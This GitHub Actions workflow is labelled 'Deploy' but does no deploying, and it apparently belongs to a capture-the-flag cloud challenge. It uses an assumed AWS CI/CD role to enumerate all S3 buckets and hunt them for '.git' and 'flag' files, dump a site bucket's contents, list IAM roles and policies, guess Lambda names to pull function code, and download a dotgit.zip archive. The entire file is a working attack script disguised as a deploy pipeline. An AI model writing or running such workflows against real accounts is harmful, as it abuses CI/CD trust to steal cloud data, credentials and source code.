name: Deploy
on:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          role-session-name: gha-${{ github.run_id }}
          aws-region: eu-central-1

      - name: Who am I
        run: aws sts get-caller-identity

      - name: List buckets and hunt for .git or flag
        run: |
          echo "## Buckets visible to this role:"
          aws s3api list-buckets --query 'Buckets[].Name' --output text | tr '\t' '\n'
          echo
          echo "## Hunting for .git/ and flag across buckets:"
          for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
            echo "=== $b ==="
            aws s3 ls "s3://$b/" --recursive 2>/dev/null | grep -iE '\.git/|flag' || echo "  (nothing matched)"
          done
      - name: Explore the site bucket
        run: |
          echo "==== listing ===="
          aws s3 ls s3://site781fe43f26b9eba3/ --recursive
          echo "==== trying to read files ===="
          for k in $(aws s3api list-objects-v2 --bucket site781fe43f26b9eba3 --query 'Contents[].Key' --output text 2>/dev/null); do
            echo "----- $k -----"
            aws s3 cp "s3://site781fe43f26b9eba3/$k" - 2>/dev/null | head -40 || echo "(denied)"
          done
            
      - name: Enumerate roles & policies
        run: |
          echo "---- my attached policies ----"
          aws iam list-attached-role-policies --role-name cicdRole 2>/dev/null || echo "denied"
          aws iam list-role-policies --role-name cicdRole 2>/dev/null || echo "denied"
          echo "---- roles in account ----"
          aws iam list-roles --query 'Roles[].[RoleName,Arn]' --output text 2>/dev/null || echo "denied"

      - name: Get Lambda code
        run: |
          aws lambda list-functions \
            --query 'Functions[].FunctionName' --output text 2>&1 || echo "list denied"
          
          # אם יש שם, נסה get-function על שמות צפויים
          for name in nslookup dns-lookup lookup cloudescape stage1 faith; do
            echo "--- trying: $name ---"
            aws lambda get-function --function-name "$name" 2>/dev/null && break || true
          done


      - name: Read from platform-bucket
        run: |
          echo "---- dotgit.zip ----"
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/dotgit.zip /tmp/dotgit.zip 2>&1
          ls -la /tmp/dotgit.zip 2>/dev/null || echo "denied"  
